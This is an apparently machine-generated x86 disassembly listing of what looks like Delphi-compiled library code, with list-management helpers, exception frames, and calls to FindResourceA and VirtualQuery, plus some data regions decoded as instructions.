inc esp
add [ eax + esi ] dh
inc esp
add al cl
das
inc esp
add [ eax ] ch
das
inc esp
add [ eax + 0x2f ] dl
inc esp
add [ eax + 0x2f ] al
inc esp
add [ edi + ebp + 0x10044 ] dl
les esp [ edi ]
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x1c909090
mov bh 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 + 0x43 ] ah
add [ edi + esi * 4 + 0x43 ] ch
add [ eax + eax ] al
add ah dh
mov ah 0x43
add [ esp + ebp ] bh
inc esp
add [ eax + 0x100044c2 ] ah
and al [ eax + eax - 0x58 ]
retn 0x44
sub_43b77c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov esp ebp
pop ebp
retn
sub_43b7a0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] dx
mov [ ebp - 0x2 ] ax
mov ax [ ebp - 0x2 ]
mov [ ebp - 0x8 ] ax
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x6 ] ax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_43b7c8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax + 0xc ] edx
mov esp ebp
pop ebp
retn 0x8
sub_43b800
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
mov esp ebp
pop ebp
retn 0x8
sub_43b84c
push ebp
mov ebp esp
add esp 0xfffffff0
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43b8af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
call sub_44c7a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b8b6
lea eax [ ebp - 0x10 ]
call sub_44cae0
retn
sub_43b8bc
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_43c9e4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43b96c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x0
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_43ca60
retn
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
call sub_44c848
jmp r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x14 ]
jne r-xdata
call sub_44c848
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_43c464
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44bfd0
test al al
je r-xdata
sub_43b97c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43b8bc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43b84c
sub_43b9a8
push ebp
mov ebp esp
add esp 0xfffffee0
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43ba77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44bfb8
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ r-xdata ]
jne r-xdata
mov eax [ ebp - 0x18 ]
call sub_43b840
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_43b8bc
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
call sub_44bff8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
movsx eax [ eax ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x10 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ba7e
lea eax [ ebp - 0x20 ]
call sub_44cae0
retn
inc [ ebp - 0x10 ]
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
mov eax [ edx + eax * 4 + 0x2 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x120 ]
mov eax [ ebp - 0xc ]
call sub_44bfbc
lea edx [ ebp - 0x120 ]
lea eax [ ebp - 0x20 ]
call sub_44cd04
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
call sub_446260
test al al
jne r-xdata
sub_43ba88
push ebp
mov ebp esp
add esp 0xfffffeec
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43bb84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_43c9e4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43bb67
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_43c504
inc eax
je r-xdata
lea edx [ ebp - 0x10c ]
mov eax [ ebp - 0x4 ]
call sub_44bfbc
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0x8 ]
call sub_44cd04
mov eax [ ebp - 0x8 ]
call sub_43b8bc
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bb6e
mov eax [ rw-data ]
call sub_43ca60
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_43c264
mov eax [ ebp - 0x4 ]
cmp eax [ r-xdata ]
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea eax [ ebp - 0x114 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447b20
call sub_44c7a8
mov eax [ ebp - 0x4 ]
call sub_44bff8
mov [ ebp - 0x4 ] eax
sub_43bb90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ecx edx
test ecx ecx
js r-xdata
mov eax esp
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
test eax eax
jl r-xdata
mov ebx [ eax + ecx * 4 ]
dec ecx
push ebx
jns r-xdata
mov ebx [ ebp - 0x14 ]
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax [ eax + edx * 4 ]
call sub_43ba88
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
sub_43bbdc
push ebp
mov ebp esp
add esp 0xffffffd8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_43c9e4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43bcb0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax 0x0
jl r-xdata
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bcb7
mov eax [ rw-data ]
call sub_43ca60
retn
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_43c2dc
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x1c
lea eax [ ebp - 0x28 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_43c464
push eax
call VirtualQuery
cmp [ ebp - 0x4 ] 0x0
je r-xdata
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
push 0x1c
lea eax [ ebp - 0x28 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
call VirtualQuery
cmp [ ebp - 0x4 ] 0x0
je r-xdata
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
sub_43bcc0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebp + 0x100043 ] bh
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
sub_43bd14
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43bd6c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43bd14
mov edx eax
mov eax [ rw-data ]
call sub_43c958
mov esp ebp
pop ebp
retn
sub_43bda4
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_43c9e4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43be2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_43ca60
retn
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
call sub_44c848
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_43c464
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_43be3c
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
jl r-xdata
mov [ ebp - 0xd ] 0x0
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ eax + edx * 8 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ eax + edx * 8 + 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_446260
test al al
je r-xdata
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn 0x4
sub_43be9c
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
jl r-xdata
mov [ ebp - 0xd ] 0x0
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x14 ]
mov edx [ edx + ecx * 8 + 0x4 ]
call sub_44cb34
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ eax + edx * 8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn 0x4
sub_43bef8
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0xa
mov eax [ ebp - 0x4 ]
call sub_44cf24
push eax
mov eax [ ebp - 0x8 ]
push eax
call FindResourceA
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
setne [ ebp - 0xd ]
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
push 0xa
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f1b8
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_43bf88
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov edx [ edx ]
mov eax [ ebp - 0x18 ]
call sub_43ec74
mov edx [ ebp - 0xc ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_44c070
retn
sub_43bf9c
push ebp
mov ebp esp
push ebx
call sub_401140
cmp [ eax + 0x4 ] 0x0
jne r-xdata
call sub_401140
mov eax [ eax ]
push eax
call sub_401140
mov eax [ eax + 0x4 ]
pop edx
call sub_43c264
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov ebx eax
call sub_401140
mov [ eax ] ebx
pop ebx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov ebx eax
call sub_401140
mov [ eax + 0x4 ] ebx
sub_43c000
push ebp
mov ebp esp
add esp 0xfffffff4
call sub_401140
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43c464
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
sub_43c048
push ebp
mov ebp esp
push ebx
call sub_401140
mov eax [ eax ]
call sub_44c070
call sub_401140
mov eax [ eax + 0x4 ]
call sub_43c600
mov ebx eax
call sub_401140
mov [ eax ] ebx
call sub_401140
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
push eax
call sub_401140
mov eax [ eax + 0x4 ]
pop edx
call sub_43c2dc
call sub_401140
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
pop ebp
retn
call sub_401140
lea eax [ eax + 0x4 ]
call sub_448fa8
sub_43c0c0
push ebp
mov ebp esp
add esp 0xfffffef4
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43c165
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c16c
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44bff8
call sub_43c0c0
pop ecx
mov [ ebp - 0x5 ] al
lea edx [ ebp - 0x10c ]
mov eax [ ebp - 0x4 ]
call sub_44bfbc
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_44cd04
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44de28
call sub_44de30
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_43bef8
or al [ ebp - 0x5 ]
mov [ ebp - 0x5 ] al
sub_43c174
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_448ef8
xor eax eax
push ebp
push sub_43c222
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x20 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_43c203
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_44bfb8
call sub_43c0c0
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_43bf9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c20a
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_43c000
retn
call sub_43c048
sub_43c238
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8 ]
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_43c264
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0xc ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ eax + edx * 4 ] ecx
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_43c2bc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43c7b8
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43c75c
pop ecx
pop ebp
retn
sub_43c2dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_43c3b8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x8 ]
jl r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
sub eax [ ebp - 0x8 ]
mov ecx eax
shl ecx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
lea edx [ eax + edx * 4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ ebp - 0x8 ]
lea eax [ eax + ebx * 4 + 0x4 ]
call sub_44bbe8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x8 ]
jge r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov cl 0x2
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_43c378
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push ebp
call sub_43c370
pop ecx
push eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
jmp sub_44c7a8
sub_43c3b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43c40c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_44e378
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_43c378
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c413
lea eax [ ebp - 0x10 ]
call sub_44cae0
retn
sub_43c418
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0xc ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
sub_43c444
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43c464
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_43c464
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_43c3b8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x8 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ eax + edx * 4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_43c4ac
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x40
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x8
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
test eax eax
jns r-xdata
mov [ ebp - 0x8 ] 0x4
mov [ ebp - 0x8 ] 0x10
jmp r-xdata
sar eax 0x2
mov [ ebp - 0x8 ] eax
jmp r-xdata
add eax 0x3
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43c75c
pop ecx
pop ecx
pop ebp
retn
sub_43c504
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x8 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
mov eax [ eax + edx * 4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov [ ebp - 0xc ] 0xffffffff
inc [ ebp - 0xc ]
sub_43c550
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_43c3b8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x8 ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0xc ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ eax + edx * 4 ] ecx
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
sub eax [ ebp - 0x8 ]
mov ecx eax
shl ecx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
lea edx [ eax + edx * 4 + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ ebp - 0x8 ]
lea eax [ eax + ebx * 4 ]
